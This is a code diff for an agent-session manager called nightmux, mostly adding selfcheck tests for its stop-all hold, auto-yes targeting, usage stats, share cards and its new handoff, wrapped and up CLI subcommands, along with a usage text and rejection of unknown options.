+            assert "budget: $2.30 of $2.00" in bsaid_[-1] and budget_line(bcfg_, "3") == "$2.30 of $2.00 this day"
+            shutil.rmtree(d_)
+            assert "hold lifted" in handle(bcfg_, bst_, threading.Lock(), "3", "!budget off")
             spend_note("b", 5, now=time.time() - 40 * 86400)
             assert len(sav_data()["spent"]["b"]) == 2   # added, then pruned on the next note
             spend_note("b", 5)
             assert len(sav_data()["spent"]["b"]) == 1, sav_data()["spent"]
     finally:
         _sav.update(old_sav_)
+    # !stopall interrupts what is working, holds the rest, and only !stopall
+    # off lifts it: not a usage window that resets.
+    xkeys_ = []
+    xcfg_ = {"topics": {"1": "x1", "2": "x2"}, "bench": {"1": {"claude": "x1", "codex": "x1-codex"}}}
+    xst_ = {"x1": {"mode": "busy"}, "x2": {"mode": "idle", "queue": ["q"], "limit_until": time.time() - 1}}
+    with stubbed(save_queue=lambda s: None, has_session=lambda s: True, agentless=lambda s: False,
+                 visible=lambda s: [s], pane_state=lambda l: "busy" if l == ["x1"] else "idle",
+                 tmux=lambda *a: xkeys_.append(a) or "", snapshot_repo=lambda s: None,
+                 inject=lambda s, t: xkeys_.append(("inject", s, t)) or True,
+                 send=lambda c, t, x, mode="mono", buttons=None, quiet=False: None):
+        out_ = handle(xcfg_, xst_, threading.Lock(), "2", "!stopall")
+        assert "stopped 3: x1 (interrupted), x1-codex, x2" in out_, out_
+        assert xkeys_ == [("send-keys", "-t", tgt("x1"), "C-c")], xkeys_
+        assert "!stopall off" in send_prompt(xcfg_, xst_, "1", "x1", "more") and xst_["x1"]["queue"] == ["more"]
+        drain(xcfg_, xst_, "2", "x2")
+        assert len(xkeys_) == 1 and "limit_until" not in xst_["x2"], xkeys_   # the window reset; still held
+        assert queue_blob(xst_)["x1-codex"] == {"stop_hold": True}            # and kept across a restart
+        assert "3 session(s) go again" in handle(xcfg_, xst_, threading.Lock(), "2", "!stopall off")
+        drain(xcfg_, xst_, "2", "x2")
+        assert xkeys_[-1] == ("inject", "x2", "q"), xkeys_
     cfg2["topics"].pop("9")                      # the session died; resume the topic
     handle(cfg2, {}, lk, "9", "!resume")
     assert spawned[-1][2] == "codex resume --last", spawned[-1]   # not claude's flag
@@ -19948,6 +21045,16 @@ def selfcheck():
         with stubbed(visible=lambda x: ["Run this command?", "> [1] Approve", "  [2] Reject"]):
             autoyes(ycfg, yst, "7", "ay")
         assert ypress[-1] == "1" and "auto-yes ay → 1" in ysent[-1]
+        # A topic that opted in for agy, bound to a session nightmux started as
+        # Claude: not an agy pane because Claude is the default agent. It typed
+        # 2 into Claude's prompt every few seconds, up to the hourly cap.
+        n_ = len(ypress)
+        yst["cl"] = {"mode": "waiting"}
+        autoyes(dict(ycfg, topics={"7": "cl"}, bench={}, started={"7": "claude"}), yst, "7", "cl")
+        assert len(ypress) == n_, "answered a Claude pane for an agy opt-in"
+        yst["un"] = {"mode": "waiting"}         # one nothing is known about still does
+        autoyes(dict(ycfg, topics={"7": "un"}, bench={}, started={}), yst, "7", "un")
+        assert len(ypress) == n_ + 1, "the single-agent fallback stopped answering"
     assert "auto-yes on for: agy" in handle(ycfg, yst, lk, "7", "!autoyes on")
     assert "usage" in template_cmd({}, {}, None, "1", "") and "what?" in template_cmd({}, {}, None, "1", "api")
     assert all("{what}" in v for v in TEMPLATES.values())
@@ -20377,11 +21484,13 @@ def selfcheck():
                                  "max_ctx": 50, "tokens": {"input": 10, "cache_read": 90, "cache_write": 0,
                                                            "output": 5, "thinking": 0},
                                  "avg_prompt": 100, "nudge_pct": 0.1, "nudges": [["ok", 1]],
-                                 "models": {"opus": 4}, "daily": {"2026-10-12": [400, 4]}}}}
+                                 "models": {"opus": 4}, "daily": {"2026-10-12": [400, 4]},
+                                 "by_model": {"opus": [1, 2, 3, 4]}}}}
     a2_ = json.loads(json.dumps(a1_))
     a2_["agents"]["claude"].update(prompts=30, avg_prompt=200, nudge_pct=0.5, max_ctx=80,
                                    tokens={"input": 90, "cache_read": 10, "cache_write": 0,
-                                           "output": 5, "thinking": 0})
+                                           "output": 5, "thinking": 0},
+                                   by_model={"opus": [10, 20, 30, 40], "other": [1, 1, 1, 1]})
     a2_["when"] = {"projects": [["shop", 1], ["blog", 2]], "at": {"10": 1, "11": 4}}
     got_ = {"api/analysis?days=30": a2_, "api/savings": {"since": 50, "tokens": 7, "tokens_day": {"2026-10-01": 7}},
             "api/lessons": {"n": 4, "ok": 2, "winners": ["w2"]}}
@@ -20394,6 +21503,7 @@ def selfcheck():
         c_ = m_["agents"]["claude"]
         assert m_["servers"] == ["vps1", "vps2"] and c_["prompts"] == 40 and c_["max_ctx"] == 80
         assert c_["daily"] == {"2026-10-12": [800, 8]}, c_["daily"]
+        assert c_["by_model"] == {"opus": [11, 22, 33, 44], "other": [1, 1, 1, 1]}, c_["by_model"]
         assert c_["cache_hit"] == 0.5 and c_["avg_prompt"] == 175 and c_["nudge_pct"] == 0.4, c_
         assert m_["when"] == {"projects": [("shop", 4), ("blog", 2)], "at": {"10": 3, "11": 4}}, m_["when"]
         assert len(m_["tips"]) == 2 and "vps2" in stats_report(m_).splitlines()[0]
@@ -20486,7 +21596,7 @@ def selfcheck():
         hr_ = int(time.time() // 3600)
         with open(os.path.join(cdir_, "sav.json"), "w") as f:
             json.dump({"spent": {"work": {str(hr_): 1500}}}, f)
-        assert companion_allowance(ccf_) == (1500, 1000)
+        assert companion_allowance(ccf_)[:2] == (1500, 1000)
         try:
             companion_prompt(ccf_, "9", "go")
             raise AssertionError("a spent allowance must refuse")
@@ -20556,7 +21666,179 @@ def selfcheck():
             sp_ = share_page_html(tcfg, {"days": ["30"]}, "https://demo.example.com")
             assert 'property="og:image"' in sp_ and 'name="twitter:card"' in sp_, sp_[:400]
             assert "navigator.canShare" in sp_ and "demo.example.com/share/card.svg" in sp_, sp_[:600]
+        assert "AT API LIST PRICES" not in svg_ and "$677" in share_card_svg(tcfg, {"tokens": ["1M"], "usd": ["$677"]})
+        # the card's query follows the labels, not the order: the dollar cell sits second
+        with stubbed(wrapped_data=lambda c, d: {"cells": [("14.2M", "TOKENS CRUNCHED"), ("$677", "AT API LIST PRICES"),
+                                                          ("41%", "SAVED FROM THE ABYSS (5.0M)"),
+                                                          ("2.0M", "SAVED VIA SMART ROUTING"),
+                                                          ("128", "VIBE DIRECTIVES ISSUED")],
+                                                "agents": ["claude"], "projects": [("a", 1)],
+                                                "split": [], "hours": [0] * 24, "insights": []}):
+            cq_ = urllib.parse.parse_qs(html.unescape(re.search(
+                r'/share/card\.svg\?([^"]+)"', share_page_html(tcfg, {"days": ["30"]}, "https://d.example.com")).group(1)))
+            assert [cq_[k] for k in ("tokens", "usd", "saved", "lighter", "prompts")] == [
+                ["14.2M"], ["$677"], ["41%"], ["2.0M"], ["128"]], cq_
         assert "url=https%3A%2F%2Fd.uguu.se%2Fx.png" in reddit_url("my recap", "https://d.uguu.se/x.png")
+    # The CLI: -h prints usage, and an unknown option stops. `nightmux --help`
+    # used to fall through to main() and start a daemon on the live config.
+    import io
+    ran_ = []
+
+    def cli_(*args):
+        old_argv_, sys.argv = sys.argv, ["nightmux", *args]
+        out_, err_, code_ = io.StringIO(), io.StringIO(), None
+        try:
+            with contextlib.redirect_stdout(out_), contextlib.redirect_stderr(err_):
+                cli()
+        except SystemExit as e:
+            code_ = e.code
+        finally:
+            sys.argv = old_argv_
+        return code_, out_.getvalue(), err_.getvalue()
+
+    with stubbed(main=lambda: ran_.append("daemon")):
+        for args_ in (("--help",), ("-h",), ("--help", "--bogus")):
+            code_, out_, err_ = cli_(*args_)
+            assert code_ is None and "usage: nightmux" in out_ and "--doctor" in out_ and not ran_, (args_, out_, ran_)
+        for args_ in (("--bogus",), ("setup",)):
+            code_, out_, err_ = cli_(*args_)
+            assert code_ == 2 and "unknown option" in err_ and "usage: nightmux" in err_ and not out_ and not ran_, (args_, code_, err_, ran_)
+        # `wrapped` reads transcripts and nothing else: no daemon, nothing sent
+        for args_ in (("wrapped", "0"), ("wrapped", "366"), ("wrapped", "x"), ("wrapped", "²"), ("wrapped", "7", "8")):
+            code_, out_, err_ = cli_(*args_)
+            assert code_ == 2 and "usage: nightmux wrapped" in err_ and not out_ and not ran_, (args_, code_, err_)
+        with stubbed(analyze_chats=lambda d: {"agents": {}, "when": {}}, sav_data=lambda: {"tokens": 0, "model_tokens": 0}):
+            code_, out_, err_ = cli_("wrapped", "3")
+            assert isinstance(code_, str) and code_.startswith("no agent transcripts") and not ran_, code_
+        with tempfile.TemporaryDirectory() as wo_, stubbed(
+                analyze_chats=lambda d: r2_, sav_data=lambda: {"tokens": 0, "model_tokens": 0},
+                browser_bin=lambda cfg: None):
+            so_, se_ = io.StringIO(), io.StringIO()
+            with contextlib.redirect_stdout(so_), contextlib.redirect_stderr(se_):
+                wrapped_cli(["7"], out=os.path.join(wo_, "cards"))
+            priv_, pub_ = (open(os.path.join(wo_, "cards", f"nightmux-wrapped{s}.html"), encoding="utf-8").read()
+                           for s in ("", "-share"))
+            assert "shop" in priv_ and "shop" not in pub_ and "project 1" in pub_, (priv_, pub_)
+            assert "SECRETPROMPT" not in so_.getvalue() + priv_ + pub_
+            assert "$8.40 at API list prices" in so_.getvalue() and "last 7 days" in so_.getvalue(), so_.getvalue()
+            assert "not counted: " in so_.getvalue() and "gpt-x" in so_.getvalue(), so_.getvalue()
+            assert "Nothing was uploaded" in so_.getvalue() and "last 7 days" in se_.getvalue(), (so_.getvalue(), se_.getvalue())
+        # `handoff`: the newest conversation in a folder, a brief, another agent started on it
+        with tempfile.TemporaryDirectory() as hh_:
+            def w_(rel, rows, age):
+                p_ = os.path.join(hh_, rel)
+                os.makedirs(os.path.dirname(p_), exist_ok=True)
+                with open(p_, "w", encoding="utf-8") as f_:
+                    f_.writelines(json.dumps(r_, separators=(",", ":")) + "\n" for r_ in rows)
+                os.utime(p_, (time.time() - age,) * 2)
+                return p_
+            repo_ = os.path.join(os.path.realpath(hh_), "repo")   # git answers with the resolved path
+            os.makedirs(os.path.join(repo_, "sub"))
+            for g_ in (("init", "-q"), ("-c", "user.email=a@b", "-c", "user.name=a",
+                                         "commit", "-q", "--allow-empty", "-m", "first commit")):
+                subprocess.run(["git", "-C", repo_, *g_], check=True, capture_output=True)
+            open(os.path.join(repo_, "up.py"), "w").close()
+            u_ = lambda text, **kw: {"type": "user", "cwd": repo_, "message": {"role": "user", "content": text}, **kw}
+            cl_ = w_(".claude/projects/-r/a.jsonl", [
+                u_("older ask"),
+                {"type": "assistant", "message": {"content": [
+                    {"type": "text", "text": "I will add a retry loop around the upload call."},
+                    {"type": "tool_use", "name": "Edit", "input": {"file_path": "up.py"}}]}},
+                u_("add retry to the uploader"),
+                {"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "t", "content": "ok"}]}},
+                {"type": "user", "message": {"content": [{"type": "text", "text": "reminder text, not agent reasoning"}]}},
+                u_("meta noise", isMeta=True), u_("<command-name>/clear</command-name>"), u_("/compact"),
+                u_("/effort max"), u_("This session is being continued from a previous conversation", isCompactSummary=True)], 100)
+            cx_ = w_(".codex/sessions/2026/10/22/rollout-1.jsonl", [
+                {"type": "session_meta", "payload": {"cwd": os.path.join(repo_, "sub")}},
+                {"type": "event_msg", "payload": {"type": "user_message", "message": "codex ask"}}], 200)
+            w_(".claude/projects/-o/b.jsonl", [u_("elsewhere", cwd=os.path.join(hh_, "other"))], 10)
+            w_(".claude/projects/-p/c.jsonl", [u_("a sibling folder with the same prefix", cwd=repo_ + "2")], 5)
+            assert latest_chat(repo_, home=hh_) == ("claude", cl_, "add retry to the uploader")
+            os.utime(cx_, (time.time() - 50,) * 2)     # newest in the repo, from its sub folder
+            assert latest_chat(repo_, home=hh_) == ("codex", cx_, "codex ask")
+            assert latest_chat(os.path.join(hh_, "nowhere"), home=hh_) == (None, None, "")
+            os.utime(cx_, (time.time() - 200,) * 2)
+            execs_, real_latest_ = [], latest_chat
+
+            def hand_(*a_, where=repo_):
+                old_cwd_ = os.getcwd()
+                os.chdir(where)
+                try:
+                    with stubbed(load_cfg=lambda: {"agents": {"codex": ["/bin/sh", ""], "opencode": ["/bin/sh", ""],
+                                                              "agy": ["/nonexistent/agy", ""]}},
+                                 latest_chat=lambda root: real_latest_(root, home=hh_),
+                                 _exec=execs_.append, setup=lambda: ran_.append("setup")):
+                        return cli_("handoff", *a_)
+                finally:
+                    os.chdir(old_cwd_)
+            code_, out_, err_ = hand_()
+            hp_ = os.path.join(repo_, ".nightmux", "HANDOFF.md")
+            assert code_ is None and not execs_ and not err_, (code_, err_)
+            assert "reminder text" not in out_ and "/compact" not in out_ and "being continued" not in out_, out_
+            for want_ in ("## Last Instruction\nadd retry to the uploader", "`Edit`", "retry loop", "?? up.py",
+                          "## Recent Commits", "first commit", "saved to " + hp_, "codex"):
+                assert want_ in out_, (want_, out_)
+            assert open(hp_, encoding="utf-8").read().startswith("# 🧬") and ".nightmux/" in open(
+                os.path.join(repo_, ".git", "info", "exclude")).read().split()
+            code_, out_, err_ = hand_("codex", "also", "add", "tests")
+            assert code_ is None and len(execs_) == 1 and execs_[0][0] == "/bin/sh", (code_, execs_, err_)
+            assert execs_[0][1].startswith("claude was working in this directory") and hp_ in execs_[0][1], execs_
+            assert execs_[0][1].endswith("Next instruction:\nalso add tests"), execs_
+            assert "claude → codex" in out_ and "last instruction: add retry to the uploader" in out_, out_
+            hand_("opencode")
+            assert execs_[-1][:2] == ["/bin/sh", "--prompt"] and len(execs_[-1]) == 3, execs_
+            hand_("codex", "--setup")       # instruction text, not a flag: nothing else runs
+            assert execs_[-1][1].endswith("Next instruction:\n--setup") and "setup" not in ran_, (execs_[-1], ran_)
+            n_ = len(execs_)
+            code_, out_, err_ = hand_("agy")
+            assert "/nonexistent/agy is not installed" in code_ and "add retry to the uploader" not in code_ and len(execs_) == n_, code_
+            code_, out_, err_ = hand_("aider")
+            assert "does not know how to start aider" in code_ and hp_ in code_ and len(execs_) == n_, code_
+            code_, out_, err_ = hand_("nope")
+            assert code_ == 2 and "unknown agent 'nope'" in err_ and "usage: nightmux handoff" in err_ and not out_, (code_, err_)
+            code_, out_, err_ = cli_("handoff", "--help")
+            assert code_ is None and out_.startswith("usage: nightmux handoff") and "codex" in out_ and not err_, out_
+            # outside a repo: nothing is written, and the brief rides in the prompt
+            plain_ = os.path.join(hh_, "plain")
+            os.makedirs(plain_)
+            code_, out_, err_ = hand_(where=plain_)
+            assert code_ is None and "not a git repo" in out_ and not os.path.exists(os.path.join(plain_, ".nightmux")), out_
+            hand_("codex", where=plain_)
+            assert "## Last Instruction" in execs_[-1][1] and ".nightmux" not in execs_[-1][1], execs_[-1]
+        # `up`: tmux first, then no second copy, then the daemon
+        from types import SimpleNamespace
+        has_ = SimpleNamespace(which=lambda c: "/usr/bin/" + c)
+        with stubbed(shutil=SimpleNamespace(which=lambda c: None if c == "tmux" else "/usr/bin/" + c)):
+            code_, out_, err_ = cli_("up")
+        assert "tmux is not installed" in code_ and "brew install tmux" in code_ and not ran_, code_
+        busy_ = socket.socket()
+        busy_.bind(("127.0.0.1", 0))
+        busy_.listen(1)
+        uport_ = busy_.getsockname()[1]
+        with stubbed(shutil=has_, load_cfg=lambda: {"webhook_port": uport_}):
+            code_, out_, err_ = cli_("up")
+        assert "already in use" in code_ and "second copy" in code_ and not ran_, code_
+        busy_.close()
+        with stubbed(shutil=has_, load_cfg=lambda: {"webhook_port": uport_}):
+            code_, out_, err_ = cli_("up")
+        assert code_ is None and ran_ == ["daemon"] and "agents found:" in out_ and "claude" in out_, (code_, out_, ran_)
+        ran_.clear()
+        code_, out_, err_ = cli_("up", "now")
+        assert code_ == 2 and "usage: nightmux up" in err_ and not out_ and not ran_, (code_, err_)
+        # ...and the phone line: no route, no QR; a route, a QR whose code is still good
+        n_ = len(_pairing_codes)
+        with stubbed(phone_url=lambda cfg, status=None: None):
+            msg_ = phone_pairing({"webhook_host": "127.0.0.1", "webhook_port": 7070})
+        assert "tailscale serve --bg 7070" in msg_ and "pair?code" not in msg_ and len(_pairing_codes) == n_, msg_
+        with stubbed(phone_url=lambda cfg, status=None: "https://box.ts.net"):
+            msg_ = phone_pairing({"webhook_host": "127.0.0.1"})
+        code_ = re.search(r"https://box\.ts\.net/pair\?code=([\w-]+)", msg_).group(1)
+        assert code_ in _pairing_codes and ("▄" in msg_ or "█" in msg_), msg_
+        with stubbed(phone_url=lambda cfg, status=None: None, get_local_ip=lambda: "192.168.1.5"):
+            msg_ = phone_pairing({"webhook_host": "0.0.0.0", "webhook_port": 7070})
+        assert "http://192.168.1.5:7070/pair?code=" in msg_, msg_
+        assert cli_() == (None, "", "") and ran_ == ["daemon"], ran_
     print("selfcheck ok")
 
 
@@ -20691,6 +21973,10 @@ def setup_checks(cfg=None):
     add("dashboard reachable from your phone", served or None,
         "" if served else (f"tailscale serve --bg {port}" if port else
                            'set "webhook_port": 9090, restart, then: tailscale serve --bg 9090'))
+    if cfg.get("office_url"):
+        why = office_url_problem(cfg["office_url"])
+        add("office link opens", why is None,
+            f"{cfg['office_url']} {why}: " + office_fix(cfg, cfg["office_url"]).replace("\n", " ") if why else "")
     try:                                                # optional: None, never ✗
         gh_ok = subprocess.run(["gh", "auth", "status"], capture_output=True,
                                timeout=20).returncode == 0 or None
@@ -20713,6 +21999,11 @@ def setup_checks(cfg=None):
             f"KillMode={km} — add 'KillMode=process' under [Service] in "
             f"{UNIT_PATH}, then: systemctl --user daemon-reload")
     add("service active", active, "nightmux --setup installs it")
+    started = service_started() if active else None
+    if started:
+        newer = code_newer_than(started)
+        add("service runs the code on disk", not newer,
+            f"nightmux's files changed after it started: {restart_hint()}" if newer else "")
     drift = reader_drift()
     for a, why in drift:
         add(f"{a} token reader", False, f"{why} — the CLI probably changed its storage "
@@ -20832,9 +22123,33 @@ def demo_serve(port=8099):
         pass
 
 
+USAGE = """usage: nightmux [command | option]
+
+  (none)               run the daemon; what the service starts
+  up                   first run, no bot needed: the dashboard, and how a phone reaches it
+  wrapped [days]       what your agents did, as a card and a dollar figure; no bot, no keys
+  handoff [agent]      hand this folder's work to another agent, with a brief; no bot, no keys
+  --setup              first run: bot token, group, hooks, service
+  --doctor             find what is wrong with this install
+  --demo [port]        the office with a made-up night; no bot, no keys
+  --join <code>        add this machine to another nightmux
+  --relay              run the QR claim relay
+  --mcp [--companion]  MCP server on stdio
+  --mcp-desktop        MCP server for the desktop app
+  --commands           every command, as markdown
+  --version            version and what it runs on
+  --selfcheck          the built-in tests
+  -h, --help           this text
+"""
+
+
 def cli():
     """Entry point for both `python3 nightmux.py` and the installed `nightmux`."""
-    if "--selfcheck" in sys.argv:
+    if sys.argv[1:2] == ["handoff"]:   # free text follows: keep it from the flag checks below
+        handoff_cli(sys.argv[2:])
+    elif "-h" in sys.argv or "--help" in sys.argv:
+        print(USAGE, end="")
+    elif "--selfcheck" in sys.argv:
         selfcheck()
     elif "--setup" in sys.argv:
         setup()
@@ -20859,6 +22174,13 @@ def cli():
         i = sys.argv.index("--demo")
         port = sys.argv[i + 1] if i + 1 < len(sys.argv) and sys.argv[i + 1].isdigit() else "8099"
         demo_serve(int(port))
+    elif sys.argv[1:2] == ["wrapped"]:
+        wrapped_cli(sys.argv[2:])
+    elif sys.argv[1:2] == ["up"]:
+        up_cli(sys.argv[2:])
+    elif len(sys.argv) > 1:     # a typo used to start a daemon on the live config
+        print(f"nightmux: unknown option {sys.argv[1]!r}\n\n{USAGE}", end="", file=sys.stderr)
+        sys.exit(2)
     else:
         main()
 
